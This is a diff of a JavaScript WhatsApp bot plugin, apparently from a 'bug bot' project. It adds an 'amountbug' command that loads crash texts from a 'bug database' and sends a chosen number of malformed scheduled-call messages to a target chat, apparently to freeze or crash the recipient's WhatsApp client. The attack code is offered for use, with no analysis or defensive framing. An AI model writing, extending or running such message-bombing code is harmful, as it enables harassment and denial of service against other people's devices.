@@ -3,6 +3,8 @@ const moment = require('moment-timezone');
 const conf = require('../set.js');
 const fs = require('fs');
 const path = require('path');
+const { generateWAMessageFromContent, proto } = require('@whiskeysockets/baileys');
+
 // bug database
 const { bugtext1 } = require('../framework/bugs/bugtext1');
 const { bugtext2 } = require('../framework/bugs/bugtext2');
@@ -85,16 +87,13 @@ docugcbug <grouplink>${mono}`;
         externalAdReply:
           {
             showAdAttribution: true,
-            containsAutoReply: true,
             title: `${conf.BOT}`,
             body: `Bot Created By ${conf.OWNER_NAME}`,
             AbhinailUrl: tumbUrl,
-            Abhinail: {url: tumbUrl},
-            image: {url: tumbUrl},
             previewType: 'PHOTO',
             sourceUrl: 'https://whatsapp.com/channel/0029VaKjSra9WtC0kuJqvl0g',
             mediaType: 1,
-            renderLargerAbhinail: false
+            renderLargerAbhinail: true
           }
         }
       }, { quoted: ms });
@@ -113,6 +112,28 @@ zokou(
   },
   
   async (dest, zk, commandOptions) => {
+    const { ms, arg, repondre, superUser } = commandOptions;
     
+    if (!superUser) 
+      return await repondre("You are not authorised to use this  command !!!");
+    if (!arg[0])
+      return await repondre(`Use ${conf.PREFIXE}amountbug amount\n> Example ${conf.PREFIXE}amountbug 5`);
+      
+    const amount = parseInt(arg[0]);
+    if (isNaN(amount) || amount > conf.BOOM_MESSAGE_LIMIT || amount < 1)
+      return await repondre(`use a vaid intiger between 1-${conf.BOOM_MESSAGE_LIMIT}`);
+    for (let i=0; i < amount; i++) {
+      const bug = `${bugtext1}`;
+      var scheduledCallCreationMessage = generateWAMessageFromContent(dest, proto.Message.fromObject({
+"scheduledCallCreationMessage": {
+"callType": "2",
+"scheduledTimestampMs": `${moment(1000).tz(conf.TZ).format("DD/MM/YYYY HH:mm:ss")}`,
+"title": bug,
+}
+}), { userJid: dest, quoted : ms});
+    zk.relayMessage(dest, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id });
+    await delay(3000);
+    }
+    await repondre(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`);
   }
   );
